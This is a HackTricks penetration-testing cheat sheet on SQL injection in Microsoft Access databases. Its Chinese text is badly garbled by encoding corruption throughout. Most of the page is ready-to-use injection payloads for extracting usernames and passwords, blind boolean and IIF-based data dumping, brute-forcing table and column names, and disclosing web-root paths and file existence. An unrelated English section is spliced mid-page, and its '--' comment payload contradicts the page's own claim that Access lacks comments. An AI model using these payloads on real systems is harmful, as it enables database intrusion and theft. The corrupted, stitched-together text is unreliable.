# MS Access SQLæ³¨å…¥

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASSï¼†HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åœ¨çº¿æ¸¸ä¹åœº

* [https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1)

## æ•°æ®åº“é™åˆ¶

### å­—ç¬¦ä¸²è¿æ¥

å¯ä»¥ä½¿ç”¨`& (%26)`å’Œ`+ (%2b)`å­—ç¬¦è¿›è¡Œå­—ç¬¦ä¸²è¿æ¥ã€‚
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### æ³¨é‡Š

åœ¨ MS Access ä¸­æ²¡æœ‰æ³¨é‡Šï¼Œä½†æ˜¾ç„¶å¯ä»¥ä½¿ç”¨ NULL å­—ç¬¦æ¥ç§»é™¤æŸ¥è¯¢çš„æœ€åä¸€ä¸ªå­—ç¬¦ï¼š
```sql
1' union select 1,2 from table%00
```
å¦‚æœè¿™ä¸èµ·ä½œç”¨ï¼Œæ‚¨å¯ä»¥å§‹ç»ˆä¿®å¤æŸ¥è¯¢çš„è¯­æ³•ï¼š
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### å †å æŸ¥è¯¢

ä¸æ”¯æŒã€‚

### é™åˆ¶

**`LIMIT`** æ“ä½œç¬¦ **æœªå®ç°**ã€‚ä½†æ˜¯ï¼Œå¯ä»¥ä½¿ç”¨ `TOP` æ“ä½œç¬¦å°† SELECT æŸ¥è¯¢ç»“æœé™åˆ¶ä¸º**å‰ N ä¸ªè¡¨è¡Œ**ã€‚`TOP` æ¥å—ä¸€ä¸ªæ•´æ•°ä½œä¸ºå‚æ•°ï¼Œè¡¨ç¤ºè¦è¿”å›çš„è¡Œæ•°ã€‚
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
å°±åƒä½¿ç”¨ **`TOP`** ä¸€æ ·ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ **`LAST`**ï¼Œå®ƒå°†ä»**æœ«å°¾è·å–è¡Œ**ã€‚

## UNIONæŸ¥è¯¢/å­æŸ¥è¯¢

åœ¨SQLiä¸­ï¼Œé€šå¸¸æ‚¨ä¼šå¸Œæœ›ä»¥æŸç§æ–¹å¼æ‰§è¡Œæ–°æŸ¥è¯¢ï¼Œä»¥ä»å…¶ä»–è¡¨ä¸­æå–ä¿¡æ¯ã€‚MS Accesså§‹ç»ˆè¦æ±‚åœ¨**å­æŸ¥è¯¢æˆ–é¢å¤–æŸ¥è¯¢ä¸­æŒ‡å®š`FROM`**ã€‚\
å› æ­¤ï¼Œå¦‚æœæ‚¨æƒ³æ‰§è¡Œ`UNION SELECT`æˆ–`UNION ALL SELECT`æˆ–åœ¨æ¡ä»¶ä¸­ä½¿ç”¨æ‹¬å·æ‰§è¡Œ`SELECT`ï¼Œæ‚¨æ€»æ˜¯**éœ€è¦æŒ‡å®šä¸€ä¸ªå¸¦æœ‰æœ‰æ•ˆè¡¨åçš„`FROM`**ã€‚\
å› æ­¤ï¼Œæ‚¨éœ€è¦çŸ¥é“ä¸€ä¸ª**æœ‰æ•ˆçš„è¡¨å**ã€‚
```sql
-1' UNION SELECT username,password from users%00
```
### é“¾æ¥ç­‰å· + å­å­—ç¬¦ä¸²

{% hint style="warning" %}
è¿™å°†å…è®¸æ‚¨åœ¨ä¸éœ€è¦çŸ¥é“è¡¨åçš„æƒ…å†µä¸‹æå–å½“å‰è¡¨çš„å€¼ã€‚
{% endhint %}

**MS Access** å…è®¸ä½¿ç”¨**å¥‡æ€ªçš„è¯­æ³•**ï¼Œä¾‹å¦‚**`'1'=2='3'='asd'=false`**ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼ŒSQLæ³¨å…¥å°†ä½äº**`WHERE`**å­å¥ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚

å‡è®¾æ‚¨åœ¨ MS Access æ•°æ®åº“ä¸­æœ‰ä¸€ä¸ª SQLiï¼Œå¹¶ä¸”æ‚¨çŸ¥é“ï¼ˆæˆ–çŒœåˆ°ï¼‰ä¸€ä¸ª**åˆ—åä¸ºç”¨æˆ·å**ï¼Œè¿™æ˜¯æ‚¨æƒ³è¦**æå–**çš„å­—æ®µã€‚æ‚¨å¯ä»¥é€šè¿‡ä½¿ç”¨**`Mid`**å‡½æ•°è·å–å­å­—ç¬¦ä¸²ï¼Œåˆ©ç”¨**å¸ƒå°”æ³¨å…¥**æ¥æ£€æŸ¥ Web åº”ç”¨ç¨‹åºåœ¨ä½¿ç”¨é“¾æ¥ç­‰å·æŠ€æœ¯æ—¶çš„ä¸åŒå“åº”ï¼Œå¹¶å¯èƒ½æå–å†…å®¹ã€‚
```sql
'=(Mid(username,1,3)='adm')='
```
å¦‚æœä½ çŸ¥é“è¦è½¬å‚¨çš„**è¡¨å**å’Œ**åˆ—å**ï¼Œå¯ä»¥ä½¿ç”¨`Mid`ã€`LAST`å’Œ`TOP`çš„ç»„åˆæ¥é€šè¿‡å¸ƒå°”SQLi**æ³„éœ²æ‰€æœ‰ä¿¡æ¯**ï¼š
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Feel free to check this in the online playground._

### æš´åŠ›ç ´è§£è¡¨å

ä½¿ç”¨é“¾æ¥ç­‰å·æŠ€æœ¯ï¼Œæ‚¨è¿˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼**æš´åŠ›ç ´è§£è¡¨å**ï¼š
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
## MS Access SQL Injection

### Introduction

In Microsoft Access databases, SQL injection can be performed using the `UNION` keyword to retrieve data from other tables. This technique can be used to extract sensitive information from the database.

### Steps to Perform SQL Injection in MS Access

1. Identify the vulnerable input fields.
2. Use a SQL injection payload with the `UNION` keyword to retrieve data from other tables.
3. Determine the number of columns in the target table using `ORDER BY` clause.
4. Craft a SQL injection payload to extract data from the desired columns.
5. Use tools like SQLMap to automate the SQL injection process.

### Example

If the vulnerable query is `SELECT name, email FROM users WHERE id = '<VULNERABLE_INPUT>';`, the following payload can be used:

```sql
' UNION SELECT 1, username FROM admin--
```

This payload will retrieve the username from the `admin` table and display it in the results of the original query.

### Prevention

To prevent SQL injection in MS Access, use parameterized queries or stored procedures to validate and sanitize user input before executing SQL queries. Additionally, limit the privileges of database users to reduce the impact of a successful SQL injection attack.
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_Feel free to check this in the online playground._

* Sqlmap common table names: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
* There is another list in [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

### Brute-Forcing Columns names

æ‚¨å¯ä»¥ä½¿ç”¨é“¾æ¥ç­‰äºæŠ€å·§**æš´åŠ›ç ´è§£å½“å‰åˆ—å**ï¼š
```sql
'=column_name='
```
æˆ–è€…ä½¿ç”¨ **group by**ï¼š
```sql
-1' GROUP BY column_name%00
```
æˆ–è€…æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•å¯¹**ä¸åŒè¡¨**çš„åˆ—åè¿›è¡Œæš´åŠ›ç ´è§£ï¼š
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### è½¬å‚¨æ•°æ®

æˆ‘ä»¬å·²ç»è®¨è®ºäº†[**é“¾æ¥ç­‰å·æŠ€æœ¯**](ms-access-sql-injection.md#chaining-equals-+-substring) **æ¥ä»å½“å‰è¡¨å’Œå…¶ä»–è¡¨ä¸­è½¬å‚¨æ•°æ®**ã€‚ä½†è¿˜æœ‰å…¶ä»–æ–¹æ³•ï¼š
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
ç®€è€Œè¨€ä¹‹ï¼Œè¯¥æŸ¥è¯¢ä½¿ç”¨â€œif-thenâ€è¯­å¥æ¥è§¦å‘æˆåŠŸæ—¶çš„â€œ200 OKâ€ï¼Œå¦åˆ™è§¦å‘â€œ500 Internal Errorâ€ã€‚åˆ©ç”¨TOP 10è¿ç®—ç¬¦ï¼Œå¯ä»¥é€‰æ‹©å‰åä¸ªç»“æœã€‚éšåä½¿ç”¨LASTå…è®¸ä»…è€ƒè™‘ç¬¬åä¸ªå…ƒç»„ã€‚åœ¨è¯¥å€¼ä¸Šï¼Œä½¿ç”¨MIDè¿ç®—ç¬¦å¯ä»¥æ‰§è¡Œç®€å•çš„å­—ç¬¦æ¯”è¾ƒã€‚é€šè¿‡é€‚å½“æ›´æ”¹MIDå’ŒTOPçš„ç´¢å¼•ï¼Œæˆ‘ä»¬å¯ä»¥è·å–æ‰€æœ‰è¡Œçš„â€œusernameâ€å­—æ®µå†…å®¹ã€‚

### åŸºäºæ—¶é—´çš„

æŸ¥çœ‹[https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676\(v=technet.10\)?redirectedfrom=MSDN)

### å…¶ä»–æœ‰è¶£çš„å‡½æ•°

* `Mid('admin',1,1)` ä»ä½ç½®1è·å–é•¿åº¦ä¸º1çš„å­å­—ç¬¦ä¸²ï¼ˆåˆå§‹ä½ç½®ä¸º1ï¼‰
* `LEN('1234')` è·å–å­—ç¬¦ä¸²é•¿åº¦
* `ASC('A')` è·å–å­—ç¬¦çš„ASCIIå€¼
* `CHR(65)` æ ¹æ®ASCIIå€¼è·å–å­—ç¬¦ä¸²
* `IIF(1=1,'a','b')` if then
* `COUNT(*)` è®¡ç®—é¡¹ç›®æ•°é‡

## æšä¸¾è¡¨

ä»[**è¿™é‡Œ**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database)å¯ä»¥çœ‹åˆ°ä¸€ä¸ªè·å–è¡¨åçš„æŸ¥è¯¢ï¼š
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
ç„¶è€Œï¼Œè¯·æ³¨æ„ï¼Œé€šå¸¸ä¼šå‘ç°SQLæ³¨å…¥æ”»å‡»ï¼Œå…¶ä¸­**æ— æ³•è®¿é—®è¯»å–è¡¨`MSysObjects`**ã€‚

## æ–‡ä»¶ç³»ç»Ÿè®¿é—®

### Webæ ¹ç›®å½•å®Œæ•´è·¯å¾„

äº†è§£**webæ ¹ç›®å½•çš„ç»å¯¹è·¯å¾„å¯èƒ½æœ‰åŠ©äºè¿›ä¸€æ­¥æ”»å‡»**ã€‚å¦‚æœåº”ç”¨ç¨‹åºé”™è¯¯æ²¡æœ‰å®Œå…¨éšè—ï¼Œå¯ä»¥å°è¯•ä»ä¸å­˜åœ¨çš„æ•°æ®åº“ä¸­é€‰æ‹©æ•°æ®æ¥æ­ç¤ºç›®å½•è·¯å¾„ã€‚

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Accessä¼šä»¥**åŒ…å«Webç›®å½•å®Œæ•´è·¯å¾„çš„é”™è¯¯æ¶ˆæ¯**åšå‡ºå“åº”ã€‚

### æ–‡ä»¶æšä¸¾

ä»¥ä¸‹æ”»å‡»å‘é‡å¯ç”¨äº**æ¨æ–­è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿä¸Šæ–‡ä»¶çš„å­˜åœ¨**ã€‚å¦‚æœæŒ‡å®šçš„æ–‡ä»¶å­˜åœ¨ï¼ŒMS Accessä¼šè§¦å‘ä¸€ä¸ªé”™è¯¯æ¶ˆæ¯ï¼Œé€šçŸ¥æ•°æ®åº“æ ¼å¼æ— æ•ˆï¼š

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

å¦ä¸€ç§æšä¸¾æ–‡ä»¶çš„æ–¹æ³•æ˜¯**æŒ‡å®šæ•°æ®åº“.è¡¨é¡¹**ã€‚**å¦‚æœ**æŒ‡å®šçš„**æ–‡ä»¶å­˜åœ¨**ï¼ŒMS Accessä¼šæ˜¾ç¤ºä¸€ä¸ª**æ•°æ®åº“æ ¼å¼é”™è¯¯æ¶ˆæ¯**ã€‚

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### .mdbæ–‡ä»¶åçŒœæµ‹

å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŸ¥è¯¢æ¥æ¨æ–­**æ•°æ®åº“æ–‡ä»¶åï¼ˆ.mdbï¼‰**ï¼š

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

å…¶ä¸­**name\[i\]æ˜¯ä¸€ä¸ª.mdbæ–‡ä»¶å**ï¼Œ**realTableæ˜¯æ•°æ®åº“ä¸­å­˜åœ¨çš„è¡¨**ã€‚å°½ç®¡MS Accessæ€»æ˜¯ä¼šè§¦å‘ä¸€ä¸ªé”™è¯¯æ¶ˆæ¯ï¼Œä½†å¯ä»¥åŒºåˆ†æ— æ•ˆæ–‡ä»¶åå’Œæœ‰æ•ˆçš„.mdbæ–‡ä»¶åã€‚

### .mdbå¯†ç ç ´è§£å™¨

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html)æ˜¯ä¸€ä¸ªå…è´¹å®ç”¨ç¨‹åºï¼Œå¯ç”¨äºæ¢å¤Microsoft Access 95/97/2000/XPæˆ–Jet Database Engine 3.0/4.0çš„ä¸»æ•°æ®åº“å¯†ç ã€‚

## å‚è€ƒèµ„æ–™

* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ä¸Šå…³æ³¨**æˆ‘ä»¬ã€‚
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
